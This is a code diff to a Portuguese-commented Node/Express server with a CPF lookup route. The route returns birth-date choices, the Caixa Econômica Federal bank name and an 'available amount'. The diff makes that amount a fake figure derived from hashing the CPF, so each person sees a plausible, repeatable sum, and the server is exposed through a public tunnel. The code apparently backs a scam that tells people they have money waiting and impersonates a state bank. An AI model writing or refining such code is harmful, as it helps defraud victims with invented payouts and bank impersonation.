@@ -28,6 +28,25 @@ function formatarData(dataStr) {
   return dataStr;
 }
 
+
+// Função para gerar valor aleatório baseado no CPF (sempre o mesmo para o mesmo CPF)
+function gerarValorPorCPF(cpf) {
+  // Usa o CPF como semente para gerar um número consistente
+  let hash = 0;
+  for (let i = 0; i < cpf.length; i++) {
+    hash = ((hash << 5) - hash) + cpf.charCodeAt(i);
+    hash = hash & hash;
+  }
+  // Gera um número entre 23500 e 267889 (centavos)
+  const min = 23500;
+  const max = 267889;
+  const valorCentavos = min + (Math.abs(hash) % (max - min + 1));
+  const valorReais = (valorCentavos / 100).toFixed(2);
+  return parseFloat(valorReais);
+}
+
+
+
 // ====================== ROTA PARA BUSCAR CPF ======================
 app.post('/buscar-cpf', async (req, res) => {
   const { cpf } = req.body;
@@ -99,10 +118,10 @@ app.post('/buscar-cpf', async (req, res) => {
       cpf: cpf,
       opcoesDatas: opcoesDatas,
       dataReal: dataNascimentoReal,
-      valorDisponivel: 1987.48,
+      valorDisponivel: gerarValorPorCPF(cpf),  // ← CORRIGIDO
       banco: 'CAIXA ECONÔMICA FEDERAL',
       agencia: '0001',
-      conta: '12345-6',
+      conta: '*****-*',
       message: 'Dados obtidos com sucesso!'
     });
 
@@ -131,7 +150,7 @@ app.post('/buscar-cpf', async (req, res) => {
       cpf: cpf,
       opcoesDatas: opcoesDatas,
       dataReal: dataReal,
-      valorDisponivel: 1987.48,
+      valorDisponivel: gerarValorPorCPF(cpf),  // ← CORRIGIDO
       banco: 'CAIXA ECONÔMICA FEDERAL',
       agencia: '0001',
       conta: '12345-6',
@@ -165,4 +184,3 @@ app.listen(PORT, '0.0.0.0', () => {
   console.log(`🌐 Acesse: http://localhost:${PORT}\n`);
   console.log(`🚀 Tunnel ready! Seu app está disponível externamente.`);
 });
-
